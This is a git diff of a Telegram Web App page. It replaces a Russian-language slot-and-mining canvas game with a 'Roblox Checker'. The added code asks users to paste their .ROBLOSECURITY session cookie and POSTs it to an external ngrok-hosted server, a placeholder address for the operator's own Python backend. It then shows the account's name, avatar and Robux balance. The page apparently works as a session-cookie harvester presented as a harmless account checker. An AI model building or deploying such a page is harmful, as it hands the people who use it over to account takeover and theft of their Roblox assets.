@@ -1,231 +1,64 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Mine Slot Pro</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { margin: 0; background: #121212; color: white; font-family: 'Arial', sans-serif; overflow: hidden; }
-        #game-container { position: relative; width: 100vw; height: 100vh; display: flex; flex-direction: column; }
-        canvas { display: block; image-rendering: pixelated; }
-        .controls { height: 80px; background: #222; display: flex; align-items: center; justify-content: center; border-top: 2px solid #444; }
-        .spin-btn { 
-            width: 70%; height: 50px; background: #3fb51e; border: none; border-radius: 10px;
-            color: white; font-weight: bold; font-size: 20px; box-shadow: 0 4px #267511; cursor: pointer;
-        }
-        .spin-btn:active { transform: translateY(2px); box-shadow: 0 2px #267511; }
+        body { font-family: sans-serif; background: #1a1a1a; color: white; text-align: center; padding: 20px; }
+        input { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
+        button { background: #0088cc; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
+        #result { margin-top: 20px; display: none; background: #2a2a2a; padding: 15px; border-radius: 10px; }
+        .avatar { width: 150px; border-radius: 10px; margin-bottom: 10px; }
+        .robux-icon { color: #f7b500; font-weight: bold; }
     </style>
 </head>
 <body>
+    <h3>Roblox Checker</h3>
+    <input type="text" id="cookieInput" placeholder="Вставь .ROBLOSECURITY">
+    <br>
+    <button onclick="checkAccount()">Проверить внутри Web App</button>
 
-<div id="game-container">
-    <canvas id="gameCanvas"></canvas>
-    <div class="controls">
-        <button class="spin-btn" onclick="startSpin()">КРУТИТЬ (SPIN)</button>
+    <div id="result">
+        <img id="avatar" class="avatar" src="">
+        <h2 id="name"></h2>
+        <p>Баланс: <span id="robux" class="robux-icon"></span> R$</p>
     </div>
-</div>
 
-<script>
-const tg = window.Telegram.WebApp;
-const canvas = document.getElementById('gameCanvas');
-const ctx = canvas.getContext('2d');
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
 
-let width, height, slotSize, mineSize;
-let isSpinning = false;
-let score = 0;
+        async function checkAccount() {
+            const cookie = document.getElementById('cookieInput').value;
+            const resDiv = document.getElementById('result');
+            
+            // ВАЖНО: Замени URL на адрес, где запущен твой Python сервер (например, через ngrok)
+            const SERVER_URL = "https://твой-адрес.ngrok-free.app/check_roblox";
 
-const COLS = 5;
-const SLOT_ROWS = 3;
-const MINE_ROWS = 6;
-
-let slots = []; // Верхняя часть 5x3
-let grid = [];  // Нижняя часть (блоки)
-let flyingPicks = []; // Кирки в полете
-
-// Инициализация
-function init() {
-    width = canvas.width = window.innerWidth;
-    height = canvas.height = window.innerHeight - 80;
-    slotSize = width / COLS;
-    mineSize = slotSize; // Делаем блоки такими же по ширине
-
-    // Заполняем слоты (пусто)
-    for(let r=0; r<SLOT_ROWS; r++) {
-        slots[r] = new Array(COLS).fill(null);
-    }
-
-    // Заполняем шахту
-    grid = [];
-    for(let r=0; r<MINE_ROWS; r++) {
-        grid[r] = [];
-        for(let c=0; c<COLS; c++) {
-            grid[r][c] = { hp: Math.random() > 0.8 ? 2 : 1, type: 'block' };
-        }
-    }
-}
-
-// Отрисовка красивой кирки
-function drawPickaxe(x, y, scale = 1, color = '#00ffff') {
-    ctx.save();
-    ctx.translate(x, y);
-    ctx.scale(scale, scale);
-    
-    // Тень
-    ctx.fillStyle = 'rgba(0,0,0,0.3)';
-    ctx.fillRect(-2, 4, 6, 25);
-
-    // Рукоятка (дерево)
-    ctx.fillStyle = '#634121';
-    ctx.fillRect(0, 0, 4, 25);
-
-    // Головка кирки (металл)
-    ctx.fillStyle = color;
-    ctx.beginPath();
-    ctx.moveTo(-15, 2);
-    ctx.quadraticCurveTo(2, -5, 19, 2);
-    ctx.lineTo(19, 6);
-    ctx.quadraticCurveTo(2, 0, -15, 6);
-    ctx.closePath();
-    ctx.fill();
-
-    // Блик
-    ctx.fillStyle = 'rgba(255,255,255,0.5)';
-    ctx.fillRect(-10, 3, 5, 1);
-    
-    ctx.restore();
-}
-
-function startSpin() {
-    if(isSpinning) return;
-    isSpinning = true;
-    tg.HapticFeedback.impactOccurred('medium');
-
-    let duration = 1500;
-    let startTime = Date.now();
-
-    const animateSpin = () => {
-        let elapsed = Date.now() - startTime;
-        
-        // Рандомно «мелькаем» кирками в слотах
-        for(let r=0; r<SLOT_ROWS; r++) {
-            for(let c=0; c<COLS; c++) {
-                slots[r][c] = Math.random() > 0.8 ? 'pick' : null;
-            }
-        }
-
-        if(elapsed < duration) {
-            requestAnimationFrame(animateSpin);
-        } else {
-            finalizeSpin();
-        }
-    };
-    animateSpin();
-}
-
-function finalizeSpin() {
-    isSpinning = false;
-    // Определяем финальные кирки и запускаем их вниз
-    for(let c=0; c<COLS; c++) {
-        let count = Math.floor(Math.random() * 3); // Сколько кирок выпало в столбце
-        for(let i=0; i<count; i++) {
-            setTimeout(() => {
-                flyingPicks.push({
-                    x: c * slotSize + slotSize/2,
-                    y: slotSize * 1.5,
-                    col: c,
-                    speed: 8 + Math.random() * 4
+            try {
+                const response = await fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ cookie: cookie })
                 });
-            }, i * 200);
-        }
-    }
-}
+                
+                const data = await response.json();
 
-function update() {
-    flyingPicks.forEach((p, index) => {
-        p.y += p.speed;
-        
-        // Проверка столкновения с блоками
-        let relativeY = p.y - (SLOT_ROWS * slotSize);
-        let row = Math.floor(relativeY / mineSize);
-        
-        if(grid[row] && grid[row][p.col] && grid[row][p.col].hp > 0) {
-            grid[row][p.col].hp--;
-            tg.HapticFeedback.impactOccurred('light');
-            flyingPicks.splice(index, 1); // Кирка ломается об блок
-            
-            // Если ряд очищен — респавним его сверху (цикл)
-            checkLevelProgress();
-        }
-
-        if(p.y > height) flyingPicks.splice(index, 1);
-    });
-}
-
-function checkLevelProgress() {
-    // Если нижний ряд пуст, сдвигаем всё
-    if(grid[MINE_ROWS-1].every(b => b.hp <= 0)) {
-        grid.pop();
-        let newRow = [];
-        for(let c=0; c<COLS; c++) newRow.push({ hp: Math.random() > 0.8 ? 2 : 1 });
-        grid.unshift(newRow);
-        score += 100;
-    }
-}
-
-function draw() {
-    ctx.clearRect(0, 0, width, height);
-
-    // 1. Рисуем сетку слотов (5x3)
-    ctx.strokeStyle = '#333';
-    for(let r=0; r<SLOT_ROWS; r++) {
-        for(let c=0; c<COLS; c++) {
-            ctx.strokeRect(c*slotSize, r*slotSize, slotSize, slotSize);
-            if(slots[r][c] === 'pick') {
-                drawPickaxe(c*slotSize + slotSize/2, r*slotSize + slotSize/2, 1.5);
+                if (data.status === "success") {
+                    document.getElementById('avatar').src = data.image;
+                    document.getElementById('name').innerText = data.username;
+                    document.getElementById('robux').innerText = data.robux;
+                    resDiv.style.display = "block";
+                    
+                    // Опционально: отправить отчет боту, что проверка прошла
+                    tg.sendData("Проверка аккаунта " + data.username + " завершена успешно!");
+                } else {
+                    alert("Ошибка: Неверные куки");
+                }
+            } catch (e) {
+                alert("Ошибка соединения с сервером");
             }
         }
-    }
-
-    // Разделитель
-    ctx.fillStyle = '#444';
-    ctx.fillRect(0, SLOT_ROWS * slotSize, width, 5);
-
-    // 2. Рисуем шахту (блоки)
-    for(let r=0; r<MINE_ROWS; r++) {
-        for(let c=0; c<COLS; c++) {
-            let b = grid[r][c];
-            if(b.hp <= 0) continue;
-
-            let x = c * mineSize;
-            let y = (SLOT_ROWS * slotSize) + (r * mineSize) + 5;
-
-            // Рисуем блок с градиентом
-            let grad = ctx.createLinearGradient(x, y, x, y + mineSize);
-            grad.addColorStop(0, b.hp > 1 ? '#777' : '#8B4513');
-            grad.addColorStop(1, b.hp > 1 ? '#444' : '#5D2E0C');
-            ctx.fillStyle = grad;
-            ctx.fillRect(x + 2, y + 2, mineSize - 4, mineSize - 4);
-            
-            // Трещины
-            if(b.hp === 1 && b.type === 'block') {
-                ctx.strokeStyle = 'rgba(0,0,0,0.5)';
-                ctx.beginPath(); ctx.moveTo(x+10, y+10); ctx.lineTo(x+30, y+30); ctx.stroke();
-            }
-        }
-    }
-
-    // 3. Рисуем летящие кирки
-    flyingPicks.forEach(p => {
-        drawPickaxe(p.x, p.y, 1.2, '#00ffff');
-    });
-
-    update();
-    requestAnimationFrame(draw);
-}
-
-init();
-draw();
-</script>
+    </script>
 </body>
 </html>
